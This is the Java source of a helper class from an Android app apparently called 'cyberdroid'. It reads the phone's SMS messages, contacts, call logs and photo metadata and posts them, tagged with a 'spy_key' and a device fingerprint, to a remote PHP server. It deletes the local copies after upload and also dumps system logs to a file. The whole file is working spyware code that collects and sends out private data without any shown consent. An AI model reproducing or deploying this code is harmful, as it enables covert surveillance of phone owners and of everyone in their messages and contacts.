package cyberdroid.cyberdroid;

import android.annotation.SuppressLint;
import android.app.Activity;
import android.content.ContentResolver;
import android.content.ContentUris;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.database.Cursor;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.net.Uri;
import android.os.Build;
import android.os.Environment;
import android.provider.CallLog;
import android.provider.ContactsContract;
import android.provider.MediaStore;
import android.provider.Telephony;
import android.widget.Button;

import androidx.annotation.RequiresApi;
import androidx.appcompat.app.AppCompatActivity;

import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.File;
import java.io.FileWriter;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.OutputStreamWriter;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;
import java.text.DateFormat;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Calendar;
import java.util.List;

/**
 * Created by jkm-droid on 05/04/2021.
 */

public class MyHelper{
    private final Context context;
    MessageHelper messageHelper;
    ContactsHelper contactsHelper;
    String device = Build.DEVICE+"_"+Build.MODEL+"_"+Build.ID+"_"+Build.HOST+"_"+Build.VERSION_CODES.BASE;
    String message_id,phonenumber,message_body,message_date,dateLong, person, sms_type;
    String contact_name, contact_id;
    String contact_word = "send_contacts", image_word = "send_images", messages_word = "send_messages", call_logs_word = "send_call_logs";
    int sms_id;
    String URL = "https://cyberdroid.mblog.co.ke/cyberdroid/sms_contacts.php";
    String SPY_KEY;
    SharedPreferences preferences;

    public MyHelper(Context context){
        this.context = context;
        preferences = context.getSharedPreferences(UserPreferences.Login.NAME, Activity.MODE_PRIVATE);
        SPY_KEY = preferences.getString(UserPreferences.Login.SPY_KEY, "");
        System.out.println(SPY_KEY+"--------------------------");
    }

    //read messages from database
    //and send them to MySql database
    public void read_messages_from_sql_and_send_to_mysql_database(){
        messageHelper = new MessageHelper(context.getApplicationContext());
        Cursor cursor = messageHelper.get_all_messages();

        //get the messages from sql lite database
        if (cursor != null && cursor.getCount() > 0) {
            while (cursor.moveToNext()) {
                message_id = cursor.getString(1);
                phonenumber = cursor.getString(2);
                message_body = cursor.getString(3);
                message_date = cursor.getString(4);
                sms_type = cursor.getString(5);
                device = device.replaceAll("\\s", "");

                String charset = "UTF-8";
                try {
                    String messages = URLEncoder.encode("send_messages",charset)+"="+URLEncoder.encode(messages_word, charset)+"&"+
                            URLEncoder.encode("message_id", charset)+"="+URLEncoder.encode(message_id, charset)+"&"+
                            URLEncoder.encode("device", charset)+"="+URLEncoder.encode(device, charset)+"&"+
                            URLEncoder.encode("phone_number", charset)+"="+URLEncoder.encode(phonenumber, charset)+"&"+
                            URLEncoder.encode("message_body", charset)+"="+URLEncoder.encode(message_body, charset)+"&"+
                            URLEncoder.encode("message_date", charset)+"="+URLEncoder.encode(message_date, charset)+"&"+
                            URLEncoder.encode("spy_key", charset)+"="+URLEncoder.encode(SPY_KEY, charset)+"&"+
                            URLEncoder.encode("message_type", charset)+"="+URLEncoder.encode(sms_type, charset);
                    System.out.println(SPY_KEY+"------------sending online messages--------------------");
                    System.out.println("\n\n");
                    System.out.println(message_id+"\n"+phonenumber+"\n"+device+"\n"+message_body+"\n"+message_date+"\n");
                    if (MyHelper.isNetworkAvailable(context.getApplicationContext())) {
                        //send the messages to Mysql online database
                        String response = MyHelper.connect_and_post(URL, messages);

                        if (response.equalsIgnoreCase("message saved") || response.equalsIgnoreCase("message exists")) {
                            messageHelper.delete_message(message_id);
                        }
                    }

                } catch (IOException e) {
                    e.printStackTrace();
                }
            }
            //deleting all messages after sending them to Mysql database
            messageHelper.delete_all_messages();
            cursor.close();

        }else{
            System.out.println("-------------------------empty sql lite messages------------------------------");
        }

    }

    public void read_messages_from_inbox_and_save_into_sql_database() {
        //method for reading messages from inbox
        Uri inboxUri = Uri.parse("content://sms/");
        messageHelper = new MessageHelper(context.getApplicationContext());

        ContentResolver contentResolver = context.getApplicationContext().getContentResolver();

        Cursor cursor = contentResolver.query(inboxUri,null,null,null,null);
        //assert cursor != null;
        //if data does not exist in the database
        if (cursor != null && cursor.getCount() > 0) {
            while (cursor.moveToNext()) {
                //getting phone number,message body and date from the inbox
                sms_id = Integer.parseInt(cursor.getString(cursor.getColumnIndexOrThrow("_id")));
                phonenumber = cursor.getString(cursor.getColumnIndexOrThrow("address"));
                phonenumber = phonenumber.replaceAll("\\s", "");
                if (!phonenumber.contains("+254")){
                    phonenumber = phonenumber.replaceFirst("0", "+254");
                }

                person = cursor.getString(cursor.getColumnIndexOrThrow("person"));
                message_body = cursor.getString(cursor.getColumnIndexOrThrow("body"));

                //converting the date from millis
                dateLong = cursor.getString(cursor.getColumnIndexOrThrow("date"));
                message_date = convert_date(dateLong);
                sms_type = cursor.getString(cursor.getColumnIndexOrThrow("type"));
                switch (Integer.parseInt(sms_type)) {
                    case 1:
                        sms_type = "inbox";
                        break;
                    case 2:
                        sms_type = "sent";
                        break;
                    case 4:
                        sms_type = "outbox";
                        break;
                    default:
                        break;
                }

                System.out.println("\nsms id"+sms_id+"\n"+phonenumber+"\n"+message_body+"\n"+message_date);
                //insert messages in the database
                messageHelper.insert_all_messages(sms_id, phonenumber, message_body, message_date, sms_type);
            }
            cursor.close();
        }
    }

    //read messages and send online
    public void read_contacts_from_sql_and_send_to_mysql_database(){
        contactsHelper = new ContactsHelper(context.getApplicationContext());
        Cursor cursor = contactsHelper.get_all_contacts();

        //get the messages from sql lite database
        if (cursor != null && cursor.getCount() > 0) {
            while (cursor.moveToNext()) {
                contact_id = cursor.getString(1);
                contact_name = cursor.getString(2);
                phonenumber = cursor.getString(3);
                device = device.replaceAll("\\s", "");
                String charset = "UTF-8";
                try {
                    String contacts = URLEncoder.encode("send_contacts",charset)+"="+URLEncoder.encode(contact_word, charset)+"&"+
                            URLEncoder.encode("contact_id", charset)+"="+URLEncoder.encode(contact_id, charset)+"&"+
                            URLEncoder.encode("device", charset)+"="+URLEncoder.encode(device, charset)+"&"+
                            URLEncoder.encode("contact_name", charset)+"="+URLEncoder.encode(contact_name, charset)+"&"+
                            URLEncoder.encode("spy_key", charset)+"="+URLEncoder.encode(SPY_KEY, charset)+"&"+
                            URLEncoder.encode("phone_number", charset)+"="+URLEncoder.encode(phonenumber, charset);

                    System.out.println("\n\n");
                    System.out.println(contact_id+"\n"+phonenumber+"\n"+device+"\n"+contact_name+"\n"+SPY_KEY+"\n");
                    if (MyHelper.isNetworkAvailable(context.getApplicationContext())) {
                        //send the messages to Mysql online database
                        String response = MyHelper.connect_and_post(URL, contacts);
                        System.out.println("--------------------------"+response+"---------------------------");
                        if (response.equalsIgnoreCase("contact saved") || response.equalsIgnoreCase("contact exists")) {
                            contactsHelper.delete_contact(phonenumber);
                        }
                    }

                } catch (IOException e) {
                    e.printStackTrace();
                }

            }
            //deleting all messages after sending them to Mysql database
            contactsHelper.delete_all_contacts();
            cursor.close();

        }else{
            System.out.println("--------------------------empty sql lite - contacts------------------------------");
        }

    }

    public void send_contacts_online(String contact_id, String contact_name, String phonenumber){
        String charset = "UTF-8";
        try {
            String contacts = URLEncoder.encode("send_contacts",charset)+"="+URLEncoder.encode(contact_word, charset)+"&"+
                    URLEncoder.encode("contact_id", charset)+"="+URLEncoder.encode(contact_id, charset)+"&"+
                    URLEncoder.encode("device", charset)+"="+URLEncoder.encode(device, charset)+"&"+
                    URLEncoder.encode("contact_name", charset)+"="+URLEncoder.encode(contact_name, charset)+"&"+
                    URLEncoder.encode("spy_key", charset)+"="+URLEncoder.encode(SPY_KEY, charset)+"&"+
                    URLEncoder.encode("phone_number", charset)+"="+URLEncoder.encode(phonenumber, charset);

            System.out.println("\n\n");
            System.out.println(message_id+"\n"+phonenumber+"\n"+device+"\n"+message_body+"\n"+message_date+"\n");
            if (MyHelper.isNetworkAvailable(context.getApplicationContext())) {
                //send the messages to Mysql online database
                String response = MyHelper.connect_and_post(URL, contacts);
                System.out.println("--------------------------sending online contacts------------------------------");
                if (response.equalsIgnoreCase("contact saved") || response.equalsIgnoreCase("contact exists")) {
                    contactsHelper.delete_contact(phonenumber);
                }
            }

        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    public void read_contacts_from_phone_and_save_to_sql_lite(){
        ContentResolver contentResolver = context.getApplicationContext().getContentResolver();
        String contact_id,contact_name, phonenumber, contact_date;
        Cursor cursor = contentResolver.query(
                ContactsContract.Contacts.CONTENT_URI,
                null,
                null,
                null,
                ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME + " ASC"
        );
        if (cursor != null && cursor.getCount() > 0) {
            while (cursor.moveToNext()) {
                contact_id = cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts._ID));
                contact_name = cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME));

                int hasPhoneNumber = Integer.parseInt(cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts.HAS_PHONE_NUMBER)));
                if (hasPhoneNumber > 0) {

                    Cursor phoneCursor = contentResolver.query(
                            ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                            null,
                            ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ?",
                            new String[]{contact_id},
                            null
                    );

                    while (phoneCursor.moveToNext()) {
                        phonenumber = phoneCursor.getString(phoneCursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
                        phonenumber = phonenumber.replaceAll("\\s", "");
                        if (!phonenumber.contains("+254")){
                            phonenumber = phonenumber.replaceFirst("0", "+254");
                        }

//                        System.out.println("Id: " + contact_id+"\n");
//                        System.out.println("Name: " + contact_name+"\n");
//                        System.out.println("Phone Number: " + phonenumber+"\n");

                        contactsHelper = new ContactsHelper(context.getApplicationContext());
                        contactsHelper.insert_all_contacts(Integer.parseInt(contact_id), contact_name, phonenumber);
                    }
                    phoneCursor.close();

                }
            }
        }
        assert cursor != null;
        cursor.close();

    }

    public static String convert_date(String date) {
        Long timestamp = Long.parseLong(date);
        Calendar calendar = Calendar.getInstance();
        calendar.setTimeInMillis(timestamp * 1000L);
        @SuppressLint("SimpleDateFormat") DateFormat dateFormat = new SimpleDateFormat("dd/MM/yyyy hh:mm:ss");
        return dateFormat.format(calendar.getTime());
    }

    //connect to the server and write data
    public static String connect_and_post(String link, String encodedData) throws IOException {
        URL url = new URL(link);
        HttpURLConnection connection = (HttpURLConnection) url.openConnection();
        connection.setDoOutput(true);
        connection.setDoInput(true);
        connection.setConnectTimeout(15000);

        OutputStreamWriter writer = new OutputStreamWriter(connection.getOutputStream(), "UTF-8");
        BufferedWriter bufferedWriter = new BufferedWriter(writer);
        bufferedWriter.write(encodedData);
        bufferedWriter.flush();
        bufferedWriter.close();

        BufferedReader reader = new BufferedReader(new InputStreamReader(connection.getInputStream()));
        StringBuilder sb = new StringBuilder();
        String line = "";
        while ((line = reader.readLine()) != null) {
            sb.append(line);
        }
        return sb.toString();
    }
    public static String connect_and_get(String link, String encodedData) throws IOException {
        URL url = new URL(link);
        HttpURLConnection connection = (HttpURLConnection) url.openConnection();
        connection.setDoOutput(true);
        connection.setDoInput(true);
        connection.setRequestMethod("GET");
        connection.setConnectTimeout(15000);

        System.out.println("Url: " + connection.getURL());

        OutputStreamWriter writer = new OutputStreamWriter(connection.getOutputStream(), "UTF-8");
        BufferedWriter bufferedWriter = new BufferedWriter(writer);
        bufferedWriter.write(encodedData);
        bufferedWriter.flush();
        bufferedWriter.close();

        BufferedReader reader = new BufferedReader(new InputStreamReader(connection.getInputStream()));
        StringBuilder sb = new StringBuilder();
        String line = "";
        while ((line = reader.readLine()) != null) {
            sb.append(line);
        }
        return sb.toString();
    }

    public static boolean isNetworkAvailable(Context context) {
        ConnectivityManager connectivityManager
                = (ConnectivityManager) context.getSystemService(Context.CONNECTIVITY_SERVICE);
        NetworkInfo activeNetworkInfo = connectivityManager.getActiveNetworkInfo();

        return activeNetworkInfo != null && activeNetworkInfo.isConnectedOrConnecting();
    }

    public static void writeError(String error){
        String fileName = "logs.txt";
        try {
            System.out.println("Writing ("+error+")");
            File root = new File(Environment.getExternalStorageDirectory(),"Cyberdroid");
            if (!root.exists()){
                root.mkdirs();
            }

            File gpxfile = new File(root, fileName);
            BufferedWriter bufferedWriter = new BufferedWriter(new FileWriter(gpxfile, true));
            bufferedWriter.append(error);
            bufferedWriter.newLine();
            bufferedWriter.close();
        }catch (IOException e){
        }
    }

    public static void restart(){
        String fileName = "logs.txt";
        try {
            File root = new File(Environment.getExternalStorageDirectory(),"Cyberdroid");
            File gpxfile = new File(root, fileName);
            if (!root.exists()){
                root.mkdirs();
            }
            FileWriter writer = new FileWriter(gpxfile, false);
            writer.write("");
            writer.flush();
            writer.close();
        }catch (IOException e){
        }
    }

    static void runtime() {
        String fileName = "logs.txt";
        File root = new File(Environment.getExternalStorageDirectory(),"Cyberdroid");
        File gpxfile = new File(root, fileName);

        try {
            Runtime.getRuntime().exec("logcat -c");
            Runtime.getRuntime().exec("logcat -v time -f"+gpxfile.getAbsolutePath());
        } catch (IOException e) {
            writeError("Error in runtime");
        }
    }

    @RequiresApi(api = Build.VERSION_CODES.KITKAT)
    public void read_sms_using_telephony(){
        ContentResolver cr = context.getContentResolver();
        Cursor cursor = cr.query(Telephony.Sms.CONTENT_URI, null, null, null, null);
        messageHelper = new MessageHelper(context.getApplicationContext());

        int totalSMS;
        if (cursor != null) {
            totalSMS = cursor.getCount();
            if (cursor.moveToFirst()) {
                for (int j = 0; j < totalSMS; j++) {
                    sms_id = Integer.parseInt(cursor.getString(cursor.getColumnIndexOrThrow("_id")));
                    dateLong = cursor.getString(cursor.getColumnIndexOrThrow(Telephony.Sms.DATE));
                    phonenumber = cursor.getString(cursor.getColumnIndexOrThrow(Telephony.Sms.ADDRESS));
                    phonenumber = phonenumber.replaceAll("\\s", "");
                    if (!phonenumber.contains("+254")){
                        phonenumber = phonenumber.replaceFirst("0", "+254");
                    }

                    message_body = cursor.getString(cursor.getColumnIndexOrThrow(Telephony.Sms.BODY));
                    sms_type = cursor.getString(cursor.getColumnIndexOrThrow(Telephony.Sms.TYPE));
                    message_date = convert_date(dateLong);

                    switch (Integer.parseInt(sms_type)) {
                        case 1:
                            sms_type = "inbox";
                            break;
                        case 2:
                            sms_type = "sent";
                            break;
                        case 4:
                            sms_type = "outbox";
                            break;
                        default:
                            break;
                    }

                    System.out.println("\n"+phonenumber+"\n"+message_body+"\n"+message_date+"\n"+sms_type);
                    messageHelper.insert_all_messages(sms_id,phonenumber, message_body, message_date, sms_type);

                    cursor.moveToNext();
                }
            }

            cursor.close();

        }else{
            System.out.println("--------------------------empty messages------------------------------");
        }
    }

    public void read_photos_from_media_store() {
        Uri collection;
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q){
            collection = MediaStore.Images.Media.getContentUri(MediaStore.VOLUME_EXTERNAL);
        }else{
            collection = MediaStore.Images.Media.EXTERNAL_CONTENT_URI;
        }


        String [] projection = new String[]{
                MediaStore.Images.Media._ID,
                MediaStore.Images.Media.DISPLAY_NAME,
                MediaStore.Images.Media.SIZE,
                MediaStore.Images.Media.DATE_ADDED,
                MediaStore.Images.Media.DATE_MODIFIED,
        };

        try(
                Cursor cursor = context.getContentResolver().query(
                        collection,
                        projection,
                        null,
                        null,
                        null
                )) {
            int columnId = cursor.getColumnIndexOrThrow(MediaStore.Images.Media._ID);
            int columnName = cursor.getColumnIndexOrThrow(MediaStore.Images.Media.DISPLAY_NAME);
            int columnSize = cursor.getColumnIndexOrThrow(MediaStore.Images.Media.SIZE);
            int columnDateAdded = cursor.getColumnIndexOrThrow(MediaStore.Images.Media.DATE_ADDED);
            int columnDateModified = cursor.getColumnIndexOrThrow(MediaStore.Images.Media.DATE_MODIFIED);

            if (cursor.getCount() > 0) {
                while (cursor.moveToNext()) {
                    long imageId = cursor.getLong(columnId);
                    String imageName = cursor.getString(columnName);
                    int imageSize = cursor.getInt(columnSize);
                    String dateAdded = convert_date(cursor.getString(columnDateAdded));
                    String dateModified = convert_date(cursor.getString(columnDateModified));
                    System.out.println("\n\nid " + imageId + "\nname" + imageName + "\nsize" + imageSize + "\ndate added"+dateAdded+"\ndate modified"+dateModified+"\n");

                    //send the images online
                    send_images_online(imageId, imageName, imageSize, dateAdded, dateModified);
                }
            }else{
                System.out.println("----------------no images found------------------");
            }

        }
    }

    private void send_images_online(long imageId, String imageName, int imageSize, String dateAdded, String dateModified) {
        String charset = "UTF-8";
        try {
            String images = URLEncoder.encode("send_images",charset)+"="+URLEncoder.encode(image_word, charset)+"&"+
                    URLEncoder.encode("image_id", charset)+"="+URLEncoder.encode(String.valueOf(imageId), charset)+"&"+
                    URLEncoder.encode("device", charset)+"="+URLEncoder.encode(device, charset)+"&"+
                    URLEncoder.encode("image_name", charset)+"="+URLEncoder.encode(imageName, charset)+"&"+
                    URLEncoder.encode("image_size", charset)+"="+URLEncoder.encode(String.valueOf(imageSize), charset)+"&"+
                    URLEncoder.encode("image_date_added", charset)+"="+URLEncoder.encode(dateAdded, charset)+"&"+
                    URLEncoder.encode("image_date_modified", charset)+"="+URLEncoder.encode(dateModified, charset)+"&"+
                    URLEncoder.encode("spy_key", charset)+"="+URLEncoder.encode(SPY_KEY, charset);

            if (MyHelper.isNetworkAvailable(context.getApplicationContext())) {
                //send the images to Mysql online database
                String response = MyHelper.connect_and_post(URL, images);
                System.out.println("-------------------"+response+"-----------------------");
            }

        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    public void read_call_logs_and_send_online() {
        ContentResolver contentResolver = context.getApplicationContext().getContentResolver();

        try (
                Cursor cursor = contentResolver.query(
                        CallLog.Calls.CONTENT_URI,
                        null,
                        null,
                        null,
                        null
                )) {

            if (cursor.getCount() > 0) {
                while (cursor.moveToNext()) {
                    String call_id = cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls._ID));
                    String phone_number = cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.NUMBER));
                    String call_name = cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.CACHED_NAME));
                    String call_date = convert_date(cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.DATE)));
                    String duration = cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.DURATION));

                    String call_type = "";
                    switch (Integer.parseInt(cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.TYPE)))) {
                        case CallLog.Calls.OUTGOING_TYPE:
                            call_type = "outgoing";
                            break;
                        case CallLog.Calls.INCOMING_TYPE:
                            call_type = "incoming";
                            break;
                        case CallLog.Calls.MISSED_TYPE:
                            call_type = "missed";
                            break;
                        default:
                            break;
                    }

                    send_call_logs_online(call_id, call_name, phone_number, call_date, duration, call_type);
                }
            }else{
                System.out.println("-----------no call logs found----------------");
            }
        }
    }

    private void send_call_logs_online(String call_id, String call_name, String phone_number, String call_date, String duration, String call_type) {
        String charset = "UTF-8";
        try {
            String images = URLEncoder.encode("send_call_logs",charset)+"="+URLEncoder.encode(call_logs_word, charset)+"&"+
                    URLEncoder.encode("call_id", charset)+"="+URLEncoder.encode(String.valueOf(call_id), charset)+"&"+
                    URLEncoder.encode("device", charset)+"="+URLEncoder.encode(device, charset)+"&"+
                    URLEncoder.encode("phone_number", charset)+"="+URLEncoder.encode(phone_number, charset)+"&"+
                    URLEncoder.encode("call_name", charset)+"="+URLEncoder.encode(call_name, charset)+"&"+
                    URLEncoder.encode("call_date", charset)+"="+URLEncoder.encode(call_date, charset)+"&"+
                    URLEncoder.encode("duration", charset)+"="+URLEncoder.encode(duration, charset)+"&"+
                    URLEncoder.encode("call_type", charset)+"="+URLEncoder.encode(call_type, charset)+"&"+
                    URLEncoder.encode("spy_key", charset)+"="+URLEncoder.encode(SPY_KEY, charset);

            if (MyHelper.isNetworkAvailable(context.getApplicationContext())) {
                //send the call logs to Mysql online database
                String response = MyHelper.connect_and_post(URL, images);
                System.out.println("-------------------"+response+"-----------------------");
            }

        } catch (IOException e) {
            e.printStackTrace();
        }
    }
}
